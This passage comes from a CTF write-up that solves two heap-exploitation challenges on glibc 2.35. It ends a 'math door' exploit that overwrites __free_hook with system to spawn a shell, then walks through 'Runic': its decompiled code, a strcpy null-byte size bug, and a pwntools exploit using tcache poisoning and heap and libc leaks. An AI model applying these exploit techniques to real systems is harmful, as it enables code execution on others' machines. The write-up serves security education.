inc_val(1, p64(0x28)) # Forge it to point to _IO_2_1_stdout_->_IO_write_ptr
# Now, freelist pointer of tcache[0x20]: chunk[12] -> chunks[1] -> _IO_2_1_stdout

create() # Create chunks[18]
create() # Create chunks[19]
create() # Create chunks[20]
# Now, chunks[20] points to _IO_2_1_stdout_ -> _IO_write_ptr

# Increase its value by 0x30. Now, when the binary called `puts`, it will leak some
# Libc address, which is based on observation is _IO_stdfile_1_lock
inc_val(20, p64(0x30))
r.recv(5)
leaked_libc = u64(r.recv(6).ljust(8, b'\x00'))
libc.address = leaked_libc - libc.symbols['_IO_stdfile_1_lock']
log.info(f'Libc base: {hex(libc.address)}')

delete(13)
delete(14)
# Based on observation in GDB, due to the previous poisoning dirty data, when we free
# chunks[13], the pointer value will be initialized with _IO_2_1_stdout_+132 directly
# So, freelist = chunks[14] -> chunks[13] -> _IO_2_1_stdout_+132, tcache[0x20]: 2

inc_val(8, p64(0x1)) # Increase tcache_perthread_struct.counts[0] by 1, so that tcache[0x20]:3
inc_val(13, p64(0x1724)) # Increase the freelist pointer by 0x1724, so that i points to __free_hook
create() # Create chunks[21]
create() # Create chunks[22]
create() # Create chunks[23]
# Now, chunks[23] points to __free_hook

# Modify chunks[0] to "/bin/sh"
inc_val(0, b'/bin/sh\x00')

# Modify __free_hook to system
inc_val(23, p64(libc.symbols['system']))

# free("/bin/sh") :)
delete(0)
r.interactive()

```


>


**Flag: HTB{y0ur_m4th_1s_fr0m_4n0th3r_w0rld!}


## Runic


            *Description*


            Pandora is close to finally arriving at the Pharaoh’s tomb and finding the ancient relic, but she faces a tremendously complex challenge. She stumbles upon a alien-looking piece of technology that has never been mentioned in her archives, and it seems to be blocking the entrance to the Pharaoh’s tomb. The machine has some runes inscribed on its surface, but Pandora can’t work their meaning out. The only thing she knows is that they seem to appear, change and disappear when she tries to manipulate them. She really can’t figure out the inner workings of the device, but she can’t just give up. Can you help Pandora master the runes?


### Initial Analysis


We were given a binary file called `runic` and `libc.so.6`. Checking the given `libc.so.6`, it is a `libc-2.35`. Let’s `checksec` it first.


```
1
2
3
4
5

```


```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```


So, the binary enabled all protections. Let’s start disassemble it one by one.


**main


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46

```


```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-4h]

  setup(argc, argv, envp);
  puts(
    "This is the ultimate test!\n"
    "Do you have what it takes to master the runes?\n"
    "Are you worthy of laying your eyes on the Pharaoh's tomb?\n"
    "Only your actions will tell...");
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. Create rune\n2. Delete rune\n3. Edit rune\n4. Show rune\nAction: ");
      v3 = read_int();
      if ( v3 != 4 )
        break;
      show();
    }
    if ( v3 > 4 )
    {
LABEL_13:
      puts("Invalid action!");
    }
    else if ( v3 == 3 )
    {
      edit();
    }
    else
    {
      if ( v3 > 3 )
        goto LABEL_13;
      if ( v3 == 1 )
      {
        create();
      }
      else
      {
        if ( v3 != 2 )
          goto LABEL_13;
        delete();
      }
    }
  }
}

```


Okay, so from the main menu, it seems that there are 4 menu that we can use. Let’s check each function one by one. And also it called `setup` first before going to the `while` loop interactions. Let’s check all of it one by one


**setup


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15

```


```
int setup()
{
  _QWORD *v0; // rax
  int i; // [rsp+Ch] [rbp-4h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  LODWORD(v0) = setvbuf(stderr, 0LL, 2, 0LL);
  for ( i = 0; i <= 63; ++i )
  {
    v0 = MainTable;
    MainTable[i] = (char *)&items + 24 * i;
  }
  return (int)v0;
}

```


Okay, so there are two global variables called `MainTable` and `items`. Each `MainTable[idx]` entry stored the address of `items[24*idx]`.


**create


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38

```


```
unsigned __int64 create()
{
  unsigned int v1; // [rsp+0h] [rbp-20h]
  unsigned int nbytes; // [rsp+4h] [rbp-1Ch]
  char *nbytes_4; // [rsp+8h] [rbp-18h]
  __int64 buf; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  buf = 0LL;
  puts("Rune name: ");
  read(0, &buf, 8uLL);
  v1 = hash(&buf);
  if ( *(_QWORD *)(*((_QWORD *)&MainTable + (unsigned int)hash(&buf)) + 8LL) )
  {
    puts("That rune name is already in use!");
  }
  else
  {
    puts("Rune length: ");
    nbytes = read_int();
    if ( nbytes <= 0x60 )
    {
      nbytes_4 = (char *)malloc(nbytes + 8);
      strcpy(*((char **)&MainTable + v1), (const char *)&buf);
      *(_QWORD *)(*((_QWORD *)&MainTable + v1) + 8LL) = nbytes_4;
      *(_DWORD *)(*((_QWORD *)&MainTable + v1) + 16LL) = nbytes;
      strcpy(nbytes_4, (const char *)&buf);
      puts("Rune contents: ");
      read(0, nbytes_4 + 8, nbytes);
    }
    else
    {
      puts("Max length is 0x60!");
    }
  }
  return __readfsqword(0x28u) ^ v5;
}

```


Okay, first, let’s check the `hash` function because it is used in the `create` function.


**hash


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10

```


```
__int64 __fastcall hash(__int64 a1)
{
  char v2; // [rsp+10h] [rbp-8h]
  int i; // [rsp+14h] [rbp-4h]

  v2 = 0;
  for ( i = 0; i <= 7; ++i )
    v2 += *(_BYTE *)(i + a1);
  return v2 & 0x3F;
}

```


Ah okay, so basically, the `hash` function is just parsing our input byte-per-byte, add all the bytes value together, and do bitwise operator `& 0x3f` to ensure the maximum generated hash value is `0x3f`.


So, reading through the `create` function, we can see that it is trying to implement a hashmap table, where:


- It will calculate the `hash(rune_name)` to get the hashmap index.

- Fetch the `items[24*idx]` address stored in the `MainTable[idx]`.

- Create a `chunk` with size equals to `rune_length + 0x8`.

- Set `items[24*idx]` value to `rune_name`.

- Set `items[24*idx] + 0x8` value to `chunk` address.

- Set `items[24*idx] + 0x10` value to `rune_length`.

- Set `chunk` first 8 bytes to `rune_name`.

- Set `chunk+8` to `rune_contents`.


So far, there isn’t any bug in this function. Also the max size that we can allocate is `0x60`. Let’s move to the next function


**delete


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23

```


```
unsigned __int64 delete()
{
  int v1; // [rsp+Ch] [rbp-14h]
  __int64 buf; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  buf = 0LL;
  puts("Rune name: ");
  read(0, &buf, 8uLL);
  v1 = hash((__int64)&buf);
  if ( *(_QWORD *)(MainTable[v1] + 8LL) )
  {
    free(*(void **)(MainTable[v1] + 8LL));
    memset((void *)MainTable[v1], 0, 0x14uLL);
    puts("Rune deleted successfully.");
  }
  else
  {
    puts("There's no rune with that name!");
  }
  return __readfsqword(0x28u) ^ v3;
}

```


The delete function is implemented properly:


- They check whether the entry is still active or not (Prevent double free)

- They also nullify the `items` entry after freeing the chunk (Prevent Use-After-Free)


AFAIk, there isn’t anything suspicious that we can do with this function. So, let’s move to the next function.


**show


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22

```


```
unsigned __int64 show()
{
  int v0; // eax
  __int64 buf; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  buf = 0LL;
  puts("Rune name: ");
  read(0, &buf, 8uLL);
  if ( *(_QWORD *)(MainTable[(unsigned int)hash((__int64)&buf)] + 8LL) )
  {
    puts("Rune contents:\n");
    v0 = hash((__int64)&buf);
    puts((const char *)(*(_QWORD *)(MainTable[v0] + 8LL) + 8LL));
  }
  else
  {
    puts("That rune doesn't exist!");
  }
  return __readfsqword(0x28u) ^ v3;
}

```


This function is used to see the rune contents. It also prevent UAF because it checks whether the rune is still active or not. Let’s move to the next function.


**edit


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47

```


```
unsigned __int64 edit()
{
  int v0; // eax
  const void *v1; // rbx
  int v2; // eax
  int v3; // eax
  int v4; // eax
  char *dest; // [rsp+0h] [rbp-30h]
  __int64 buf; // [rsp+8h] [rbp-28h] BYREF
  char src[8]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v9; // [rsp+18h] [rbp-18h]

  v9 = __readfsqword(0x28u);
  buf = 0LL;
  *(_QWORD *)src = 0LL;
  puts("Rune name: ");
  read(0, &buf, 8uLL);
  dest = *(char **)(MainTable[(unsigned int)hash((__int64)&buf)] + 8LL);
  if ( dest )
  {
    puts("New name: ");
    read(0, src, 8uLL);
    if ( *(_QWORD *)(MainTable[(unsigned int)hash((__int64)src)] + 8LL) )
    {
      puts("That rune name is already in use!");
    }
    else
    {
      v0 = hash((__int64)src);
      strcpy((char *)MainTable[v0], src);
      v1 = (const void *)(MainTable[(unsigned int)hash((__int64)&buf)] + 8LL);
      v2 = hash((__int64)src);
      memcpy((void *)(MainTable[v2] + 8LL), v1, 0xCuLL);
      strcpy(dest, src);
      v3 = hash((__int64)&buf);
      memset((void *)MainTable[v3], 0, 0x14uLL);
      puts("Rune contents: ");
      v4 = hash((__int64)dest);
      read(0, dest + 8, *(unsigned int *)(MainTable[v4] + 16LL));
    }
  }
  else
  {
    puts("There's no rune with that name!");
  }
  return __readfsqword(0x28u) ^ v9;
}

```


This is the edit function. To summarize, it will:


- Aks for the `old_rune_name`

- Calculate the hash


- If exist:


- Ask for the `new_rune_name`.

- Validate the `new_rune_name` to prevent hash collision.

- Copy the `new_rune_name` to `items` value pointed by `MainTable[hash(old_rune_name)]`.

- Copy the `items` value pointed by `MainTable[hash(old_rune_name)]` to `MainTable[hash(new_rune_name)]`.

- Nullify the `items` pointed by `MainTable[hash(old_rune_name)]`.

- Store the `new_rune_contents` to the


- If not exist:


- It will return error


Notice that there is a small bug in the `edit` function. Take a look at this LOCs:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12

```


```
puts("New name: ");
read(0, src, 8uLL);
...
v1 = (const void *)(MainTable[(unsigned int)hash((__int64)&buf)] + 8LL);
v2 = hash((__int64)src);
memcpy((void *)(MainTable[v2] + 8LL), v1, 0xCuLL);
...
strcpy(dest, src);
...
puts("Rune contents: ");
v4 = hash((__int64)dest);
read(0, dest + 8, *(unsigned int *)(MainTable[v4] + 16LL));

```


`src` is the string of the `new_rune_name`. During moving the entry of old rune name items to the new rune name items, it uses the `hash(src)`.


However, during filling the `rune_contents`, it doesn’t directly use `hash(src)` during fetching the read size. It uses variable called `dest`, which is a string copied from `src` via `strcpy`.


`strcpy` will only copy a string until its first null byte. Yet, it uses `read(0, src, 0x8)` during filling the `src` variable, which allowed us to send null byte in the middle of its `rune_name`. That means, during the binary asks for the `rune_contents`, the read size (which is `MainTable[hash(dest)] + 16LL`) can be wrong, because the value of `dest` and `src` is different if there is a null-byte in the middle of the rune name.


For example, let say the `src` value is `\x01\x00\x02`. The result of `hash(src)` is `3`. But, the result of `hash(dest)` is `1`, because `strcpy(dest, src)` will set the `dest` value to `\x01\x00`. This means, the `size` that is used during `read(0, dest + 8, *(unsigned int *)(MainTable[v4] + 16LL));` will used the `size` of `MainTable[1]` instead of `MainTable[3]`.


Now that we’ve found the bug, let’s start to think on how to leverage this bug to gain a shell.


### Solution


We can use the bug to trigger a heap overflow bug, by setting the size larger than the actual chunk’s size. For example, we create a rune where the `rune_name_a = '\x01\x00'`, so that `hash(rune_name_a)` value is `1`, and set its size to `0x60`. Then, we create another rune where the `rune_name_b = '\x02\x00'`, so that the `hash(rune_name_b)` value is `2`, and set its size `0x10`. If we use the `edit` menu to edit the `rune_name_b` to `rune_name_c = '\x01\x00\x02`, then during fetching the new contents `size`, it will use the `rune_a` size because the `hash(dest)` of `rune_name_c` will be `1` instead of `3`.


Let’s try to think first on how we will use the heap overflow bug. Supposed that we already have an overflow, what should we do to get a leak of heap base?


The answer is we need to have two adjacent chunks, where the first chunk is the one that we can overflow, and the second chunk is a freed chunk that contains a `mangled` pointer to the heap area. Let say that we have this chunks:


```
1
2
3
4

```


```
0x0000000000000000	0x0000000000000021
0x0000000000000000	0x0000000000000000 <- chunk_a (Active)
0x0000000000000000	0x0000000000000021
0x0000000000424242	0x0000000000000000 <- chunk_b (Inactive (has been freed))

```


And we want to leak the `chunk_b`. What we can do is simply overflow the `chunk_a` until it reach the `chunk_b b` data, and then with the `show` menu, we can call `puts(chunk_a)`, which due to the overflow, it will also print the `chunk_b` value even though `chunk_b` is a free chunk and originally can’t be seen with the `show` menu.


```
1
2
3
4
5
6

```


```
0x0000000000000000	0x0000000000000021
0x6161616161616161	0x6161616161616161 <- Overflow chunk_a (Active)
0x6161616161616161	0x6161616161616161
0x0000000000424242	0x0000000000000000 <- chunk_b (Inactive (has been freed))

If we call puts(chunk_a), the content of chunk_b will be printed as well

```


This is the basic logic that we will use during leveraging the overflow bug. Not only leaking adjacent chunk values, we can also modify adjacent chunk `size` metadata, or even poisoned its `tcache` freelist pointer (if the `chunk` is a `tcache` entry). With the overflow bug, it’s enough for us to gain a shell. My main idea to trigger the shell is:


- Leak a heap address

- Leak a libc base

- Gain Remote Code Execution


#### Leak heap address


Let’s start by defining helpers first:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69

```


```
from pwn import *

exe = ELF("runic_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "165.232.98.11"
remote_port = 30688
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

def demangle(val, is_heap_base=False):
    if not is_heap_base:
        mask = 0xfff << 52
        while mask:
            v = val & mask
            val ^= (v >> 12)
            mask >>= 12
        return val
    return val << 12

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

r = conn()

def create(name, length, contents):
    r.sendlineafter(b': \n', b'1')
    r.sendafter(b': \n', name)
    r.sendlineafter(b': \n', str(length).encode())
    if length > 0:
        r.sendafter(b': \n', contents)

def delete(name):
    r.sendlineafter(b': \n', b'2')
    r.sendafter(b': \n', name)

def edit(name, new_name, contents):
    r.sendlineafter(b': \n', b'3')
    r.sendafter(b': \n', name)
    r.sendafter(b': \n', new_name)
    r.sendafter(b': \n', contents)

def show(name):
    r.sendlineafter(b': \n', b'4')
    r.sendafter(b': \n', name)
    r.recvuntil(b'contents:\n')
    r.recvline()
    out = r.recvuntil(b'\n1')[:-2]
    return out

def key(k):
    return p64(k)

```


`demangle` and `mangle` is needed because `libc-2.35` have extra protection where they sort of encrypt the freelist pointer. But as long as we got the heap leak, it’s easy to get the real address.


Now that we have defined our helpers, let’s kickstart our initial setup first.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21

```


```
'''
Initial Setup
'''
# The only purpose for this chunk is we need the size to be used
# during the edit bug. Set the key to `\x01`
create(key(0x01), 0x60, b'a'*0x60) # Let's call this `helper_chunk_a`

# We will use this chunk a lot later
create(key(0x32), 0x18, b'b'*0x18) # Let's call this `main_chunk`

# This chunk will be used as our main target to be poisoned
create(key(0x33), 0x18, b'c'*0x18) # Let's call this `poisoned_chunk`

# This chunk will be used as a helper during poisoning our `poisoned_chunk`
create(key(0x34), 0x18, b'd'*0x18) # Let's call this `helper_chunk_b`

# These allocations purposes are for heap chunks alignment later.
create(key(0x35), 0x8, b'e'*0x8)
create(key(0x36), 0x18, b'c'*0x8 + p64(0)+p64(0x41)) # Need this to align the chunks later after forgery
create(key(0x37), 0x18, b'd'*0x18)
create(key(0x38), 0x18, b'e'*0x18) # Just to be safe to prevent consolidation (heap chunk got merged during free)

```


After executing the above LOCs, below is the heap layout


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28

```


```
pwndbg> x/80gx 0x561b6d1f3290
0x561b6d1f3290:	0x0000000000000000	0x0000000000000071 <- helper_chunk_a
0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
0x561b6d1f3300:	0x6161616161616161	0x0000000000000031 <- main_chunk
0x561b6d1f3310:	0x0000000000000032	0x6262626262626262
0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
0x561b6d1f3330:	0x0000000000000000	0x0000000000000031 <- poisoned_chunk
0x561b6d1f3340:	0x0000000000000033	0x6363636363636363
0x561b6d1f3350:	0x6363636363636363	0x6363636363636363
0x561b6d1f3360:	0x0000000000000000	0x0000000000000031 <- helper_chunk_b
0x561b6d1f3370:	0x0000000000000034	0x6464646464646464
0x561b6d1f3380:	0x6464646464646464	0x6464646464646464
0x561b6d1f3390:	0x0000000000000000	0x0000000000000021 <- For alignment purposes during freeing fake chunk
0x561b6d1f33a0:	0x0000000000000035	0x6565656565656565
0x561b6d1f33b0:	0x0000000000000000	0x0000000000000031 <- For alignment purposes during freeing fake chunk
0x561b6d1f33c0:	0x0000000000000036	0x6363636363636363
0x561b6d1f33d0:	0x0000000000000000	0x0000000000000041 <- If we forge poisoned_chunk size to 0xa0 later, this position is the address of poisoned_chunk+0xa0. So, the contents in this address should be a valid heap chunk metadata. I set it to 0x41.
0x561b6d1f33e0:	0x0000000000000000	0x0000000000000031 <- For alignment purposes during freeing
0x561b6d1f33f0:	0x0000000000000037	0x6464646464646464
0x561b6d1f3400:	0x6464646464646464	0x6464646464646464
0x561b6d1f3410:	0x0000000000000000	0x0000000000000031 <- Just to be safe to prevent consolidation
0x561b6d1f3420:	0x0000000000000038	0x6565656565656565
0x561b6d1f3430:	0x6565656565656565	0x6565656565656565

```


Now, let’s free the `helper_chunk_b` and `poisoned_chunk`.


```
1
2
3
4

```


```
# Let's start by freeing our helper_chunk_b continue with poisoned_chunk
delete(key(0x34))
delete(key(0x33))
# Now, poisoned_chunk contain a mangled heap pointer to the helper_chunk_b address

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21

```


```
pwndbg> x/80gx 0x561b6d1f3290
0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
0x561b6d1f3310:	0x0000000000000032	0x6262626262626262
0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
0x561b6d1f3330:	0x0000000000000000	0x0000000000000031
0x561b6d1f3340:	0x0000561e0ca9e283	0x370a42ea29d203d9
0x561b6d1f3350:	0x6363636363636363	0x6363636363636363
0x561b6d1f3360:	0x0000000000000000	0x0000000000000031
0x561b6d1f3370:	0x0000000561b6d1f3	0x370a42ea29d203d9
0x561b6d1f3380:	0x6464646464646464	0x6464646464646464
...
pwndbg> bins
tcachebins
0x30 [  2]: 0x561b6d1f3340 —▸ 0x561b6d1f3370 ◂— 0x0

```


As you can see, `poisoned_chunk` now contains a mangled heap pointer to the helper_chunk_b address. Now, with the `edit` bug, let’s trigger an overflow in the `main_chunk`, so that we can write its contents until it reach the `poisoned_chunk` value. Don’t forget to set the new_key so that the copied hash value will be equals to `0x1`, so that the size that is being used is `0x60` (which is the size of our first hashmap entry).


```
1
2
3
4
5
6
7
8

```


```
# Leak heap address by overflowing the `main_chunk` via edit feature.
# Overflow it until just before the mangled heap pointer location.
payload = b'b'*0x28

# Set new key to `\x01\x00\x01`
# Due to the edit bug, when fetching the size for the rune contents, it will
# used size of entry with hash `\x01`, which is helper_chunk_a size (0x60)
edit(key(0x32), key(0x10001), payload)

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13

```


```
pwndbg> x/80gx 0x561b6d1f3290
0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
0x561b6d1f3310:	0x0000000000000001	0x6262626262626262
0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
0x561b6d1f3330:	0x6262626262626262	0x6262626262626262
0x561b6d1f3340:	0x0000561e0ca9e283	0x370a42ea29d203d9

```


As you can see, we have successfully overflow the `main_chunk`. If we call `show` to the `main_chunk`, it will also print the contents of `poisoned_chunk`, which is `mangled` heap pointer to `helper_chunk_b` address.


```
1
2
3
4
5

```


```
# Show the content, and last 6 bytes will be the mangled heap pointer of helper_chunk_b address
out = show(key(0x10001))
leaked_heap_addr = demangle(u64(out[-6:].ljust(8, b'\x00')))
heap_base = leaked_heap_addr >> 12 << 12
log.info(f'heap_base: {hex(heap_base)}')

```


```
1

```


```
[*] heap_base: 0x561b6d1f3000

```


Now that we’ve got the heap base address, let’s move to the next step


#### Leak libc address


In order to get a libc leak, we need to free a chunk to the unsorted bin. However, notice that the max size that we can allocate is only `0x60`, which mean even though we fulfill the `tcache` bins, the chunk will be placed to `fastbin` instead of `unsorted_bin` when the `tcache` is full.


So, I decided to use the same approach as what I did in the `math door` challenge, which is trying to fulfill the `tcache[0xa0]` bins to `7` via `tcache` poisoning, where I:


- Allocate a chunk to the `tcache_perthread_struct.counts` (which resides in the heap base)

- Set the `counts[(0xa0-0x20) // 16]` to 7.

- Forge a chunk `size` metadata to `0xa0`.

- Free it, and now the chunk contains a libc address.


Let’s do that.


```
1
2
3
4
5
6
7

```


```
# Poison poisoned_chunk tcache pointer to point
# to tcache_perthread_struct (heap_base+0x10)
tcache_struct_addr = heap_base+0x10
fake_metadata = b'b'*0x18 + p64(0) + p64(0x21) + p64(mangle(heap_base, tcache_struct_addr))
edit(key(0x10001), key(0x20001), fake_metadata)
# Now, poisoned_chunk tcache pointer will point to
# tcache_perthread_struct instead of helper_chunk_b.

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18

```


```
pwndbg> x/80gx 0x561b6d1f3290
0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
0x561b6d1f3310:	0x0000000000000001	0x6262626262626262
0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
0x561b6d1f3330:	0x0000000000000000	0x0000000000000021
0x561b6d1f3340:	0x0000561e0ca9e1e3	0x370a42ea29d203d9
0x561b6d1f3350:	0x6363636363636363	0x6363636363636363
...
pwndbg> bins
tcachebins
0x30 [  2]: 0x561b6d1f3340 —▸ 0x561b6d1f3010 ◂— 0x561b4d1f3

```


As you can see, the freelist pointer value stored in `poisoned_chunk` is changed, so that after `demangling` it, it will points to `tcache_perthread_struct` instead of to `helper_chunk_b` address. Now, if we allocate two chunks with size 0x30, it will go to the `tcache_perthread_struct`.


```
1
2
3
4
5
6

```


```
create(key(0x33), 0x18, b'a'*0x18) # Call malloc, next allocation will be placed in the tcache_perthread_struct

# This malloc will go to tcached_perthread_struct
create(key(0x34), 0x18, p64(0)+p64(0x7))
# Now, we have successfully allocate a chunk to the tcache_perthread_struct
# + we also overwrite the tcache[0xa0] size to 7, so that it is considered as full

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12

```


```
pwndbg> tele 0x561b6c45e800
00:0000│  0x561b6c45e800 (MainTable+416) —▸ 0x561b6c45e540 (items+1248) ◂— 0x34 /* '4' */
...
pwndbg> x/10gx 0x561b6c45e540
0x561b6c45e540 <items+1248>:	0x0000000000000034	0x0000561b6d1f3010 <- HashMap with key 0x34 is mapped to tcache_perthread_struct address
0x561b6c45e550 <items+1264>:	0x0000000000000018	0x0000000000000035
...
pwndbg> bins
tcachebins
0x20 [ 52]: 0x0
0x30 [  0]: 0x561b7d1f3
0xa0 [  7]: 0x0 <- We have successfully fulfill the tcache[0xa0] bins

```


Now that we have succesfully forge the tcache bins, let’s try to overwrite the `size` metadata of our `poisoned_chunk` to `0xa0`.


```
1
2
3

```


```
# Now, let forge the size of our poisoned_chunk to 0xa1 with the edit bug
fake_metadata = b'b'*0x18 + p64(0) + p64(0xa1)
edit(key(0x20001), key(0x30001), fake_metadata)

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28

```


```
pwndbg> x/80gx 0x561b6d1f3290
0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
0x561b6d1f3310:	0x0000000000000001	0x6262626262626262
0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
0x561b6d1f3330:	0x0000000000000000	0x00000000000000a1 <- poisoned_chunk size metadata is updated to 0xa0
0x561b6d1f3340:	0x0000561e0ca90033	0x6161616161616161
0x561b6d1f3350:	0x6161616161616161	0x6161616161616161
0x561b6d1f3360:	0x0000000000000000	0x0000000000000031
0x561b6d1f3370:	0x0000000561b6d1f3	0x370a42ea29d203d9
0x561b6d1f3380:	0x6464646464646464	0x6464646464646464
0x561b6d1f3390:	0x0000000000000000	0x0000000000000021
0x561b6d1f33a0:	0x0000000000000035	0x6565656565656565
0x561b6d1f33b0:	0x0000000000000000	0x0000000000000031
0x561b6d1f33c0:	0x0000000000000036	0x6363636363636363
0x561b6d1f33d0:	0x0000000000000000	0x0000000000000041 <- And if we free the poisoned_chunk, during security check on checking the next chunk, the next chunk is valid because we set this fake chunk metadata in the rune_contents with key 0x36
0x561b6d1f33e0:	0x0000000000000000	0x0000000000000031
0x561b6d1f33f0:	0x0000000000000037	0x6464646464646464
0x561b6d1f3400:	0x6464646464646464	0x6464646464646464
0x561b6d1f3410:	0x0000000000000000	0x0000000000000031
0x561b6d1f3420:	0x0000000000000038	0x6565656565656565
0x561b6d1f3430:	0x6565656565656565	0x6565656565656565

```


And now, let’s free it!


```
1
2
3

```


```
# Free it, because the tcache[0xa0] is full, it will go to unsorted bin
delete(key(0x33))
# Now, poisoned_chunk contains libc address

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18

```


```
pwndbg> x/80gx 0x561b6d1f3290
0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
0x561b6d1f3310:	0x0000000000000001	0x6262626262626262
0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
0x561b6d1f3330:	0x0000000000000000	0x00000000000000a1
0x561b6d1f3340:	0x00007fac6f9f2cc0	0x00007fac6f9f2cc0
...
pwndbg> bins
...
unsortedbin
all: 0x561b6d1f3330 —▸ 0x7fac6f9f2cc0 (main_arena+96) ◂— 0x561b6d1f3330

```


As you can see, the `poisoned_chunk` now contains libc address. To leak it, let’s repeat the same method that we use to get the `heap` address leak like before. And also don’t forget to fix the metadata back after we get the leak, just to ensure there isn’t anything weird happen later.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12

```


```
